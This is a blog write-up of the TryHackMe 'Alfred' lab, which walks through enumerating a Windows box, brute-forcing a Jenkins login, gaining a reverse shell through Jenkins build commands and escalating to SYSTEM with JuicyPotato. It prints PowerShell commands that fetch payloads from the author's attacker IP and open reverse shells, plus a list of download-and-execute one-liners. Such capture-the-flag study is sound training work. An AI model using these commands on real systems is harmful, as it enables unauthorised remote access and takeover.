---
title: Alfred (Try Hack Me)
author: Robin Goyal
date: 2021-09-14 22:45 -0400
categories: [Cybersecurity, Writeups]
tags: [thm, ctf, writeup]
hidden: true
image:
  src: https://tryhackme-images.s3.amazonaws.com/room-icons/953f1e4a27c7e04130b824ec1bc8e159.png
---

I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely communicate the pentest lifecycle.

## Scenario

**Title**: Alfred

**Description**: Exploit Jenkins to gain an initial shell, then escalate your privileges by exploiting Windows authentication tokens.

**Free/Subscriber**: Subscriber

## Enumeration

![nmap results](/assets/img/posts/thm-alfred/nmap-initial.jpg)

The task description indicated that the host does not respond to ping requests which is why we added the `-Pn` flag to our nmap scan.

From the scan results, the target is a Windows OS with three open ports:
- 80 (HTTP)
- 3389 (tcpwrapped)
- 8080 (HTTP)

### HTTP (80)

Browsing to the web application served on port 80, the index page displays a picture of Bruce Wayne and a donations request to alfred.

![80 landing](/assets/img/posts/thm-alfred/80-landing.jpg)

A few of the steps to enumerate this application:
- Check for robots.txt
- Check the page source
- Hidden directories using the 2.3-small.txt file

None of these returned any results that we could use. Apart from exploiting the old IIS version (current version is 10.0.x), the application at port 8080 may be a more useful vector.

### HTTP (8080)

![8080 landing](/assets/img/posts/thm-alfred/8080-landing.jpg)

Jenkins is a CI/CD pipeline tool used to automate builds and deployments. This already looks to be more promising than the application we just visited. Now, if only we had credentials.

I performed the same initial enumeration checks that I performed on port 80 but similarly, there were no endpoints that were accessible as an unauthenticated user.

Determining the Jenkins version for any available exploits [^jenkins-enum]

![jenkins version](/assets/img/posts/thm-alfred/jenkins-version.jpg)

On the bottom-right text, the version of this Jenkins is 2.190.1 with no available exploits (not that I looked *that* hard), unfortunately.

The default credentials for Jenkins is `admin:password` but that didn't work either. Our next resort is to try to brute force the Jenkins login form.

![jenkins hydra](/assets/img/posts/thm-alfred/jenkins-hydra.jpg)

Wow! I can't believe I didn't try admin as the password but we have our way into the target.

![jenkins logged in](/assets/img/posts/thm-alfred/jenkins-logged-in.jpg)

## Initial Foothold

We have access to the CI/CD project and build space. As an administrative user, we have the ability to create a project and execute commands that are a part of the build process [^jenkins-enum].

There is already a project created along with a completed build! Checking out the build's console output,

![console output](/assets/img/posts/thm-alfred/jenkins-build-1.jpg)

the build is executed by cmd.exe. We should be able to take advantage of this and generate a reverse shell for ourselves as `alfred\bruce`. We'll use the download and execute in-memory method to trigger a reverse TCP Powershell script [^nishang-usage] using [Nishang's](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1) reverse TCP Powershell script. The only modification we need to make is add a line at the bottom of the script to invoke the function to connect back to our netcat listener on our attacker system.

`Invoke-PowerShellTcp -Reverse -IPAddress 10.6.5.103 -Port 4444`

When this script is downloaded onto the target system, the reverse shell function will automatically execute. But, we need to get the file from our attacker system onto the target system.

We can invoke a Powershell expression to download the file using the "Net.WebClient" object [^nishang-usage]. Before we modify the build configuration, we need to serve the Powershell script using Python's http.server module and create a netcat listener on port 4444 to catch the reverse shell.

*It took me 8 attempts to modify the command and update the build configuration before I caught the reverse shell. After I slowed down and inspected the reference [^nishang-usage], it was easier to recognize the mistakes and get the correct command format.*

![build config](/assets/img/posts/thm-alfred/jenkins-build-config.jpg)

Once we save the build configuration and execute the build, we should see a log entry in our HTTP server and the reverse shell connection as `alfred\bruce`.

![reverse shell](/assets/img/posts/thm-alfred/jenkins-reverse-shell.jpg)

Woot woot! Let's grab the user flag at C:\Users\bruce\Desktop\user.txt and move on to privilege escalation.

## Privilege Escalation

Windows privilege escalation is a very new topic so the first item in the checklist I came across was to search for tokens using `whoami /priv`.

![whoami privs](/assets/img/posts/thm-alfred/whoami-privs.jpg)

The SeImpersonatePrivilege is one that I have come across before. Many of the resources recommended the JuicyPotato exploit to abuse this privilege which I did not use the first time I completed this room.

The first time I completed this room, I used the THM recommendations to generate a Meterpreter payload that connects back to a handler on the attacker system. Within Meterpreter, you can load the `incognito` module and impersonate the token fairly easily.

This time, we'll follow the steps documented in this [article](https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505) to use the JuicyPotato exploit and obtain a reverse shell as SYSTEM.

First things first, we'll download the [JuicyPotato.exe](https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe) and [nc64.exe](https://github.com/int0x33/nc.exe/raw/master/nc64.exe) binaries to the target system after serving it from our attacker system using Python's http.server module.

We can use the following command to download the nc64.exe file from the Python web server.

`powershell "IEX(New-Object Net.WebClient).downloadFile('http://10.6.5.103/nc64.exe', 'C:\Users\public\nc64.exe')" -bypass               executionpolicy`

Once the JuicyPotato.exe file is present, establish a second netcat listener and execute the JuicyPotato binary specifying the COM listening port, program to execute (netcat connection to our listener with the `-e` flag), and createprocess arguments.

In the image below, you can see the command execution of the JuicyPotato exploit on the left, and the connection from the target to our netcat listener as SYSTEM. We have obtained root!

![system privesc](/assets/img/posts/thm-alfred/system-privesc.jpg)

We can search for the root.txt flag,

![root flag](/assets/img/posts/thm-alfred/root-flag.jpg)

and consider this room completed.

## Useful Commands

### Powershell Download File

If we want to download a PS1 script and execute in memory

`powershell "IEX((New-Object Net.WebClient).downloadFile('http://10.6.5.103/script.ps1'))"`

With this method, ensure the script has the expression(s) to invoke a function or method.


Alternatively, if you want to download an executable file and execute it

`powershell "IEX((New-Object Net.WebClient).downloadFile('http://10.6.5.103/shell.exe'))"`

`Start-Process shell.exe`

## Reflection

This is the first Windows room I have encountered in this journey to redo these Try Hack Me rooms including a writeup. Dealing with a Windows room including privilege escalation seems very foreign to me. The most privesc I can complete for Windows involves `getsystem` on Metasploit but one of the big accomplishments I felt this time around was completing this room with no hints AND without using Metasploit.

Along with being foreign to Windows targets and privilege escalation, the JuicyPotato exploit completely went over my head. At some point in this journey, I'll perform significantly more research into Windows privilege escalation and these Impersonation tokens.

Lastly, this room provides the opportunity to use Powershell scripts, exposure to the Jenkins system and abusing the build system with RCE, exposure to Windows and using a manual or Metasploit privesc techniques. This room has it all!

## References

[^jenkins-enum]: <https://book.hacktricks.xyz/pentesting/pentesting-web/jenkins>

[^nishang-usage]: <https://kalilinuxtutorials.com/nishang/>
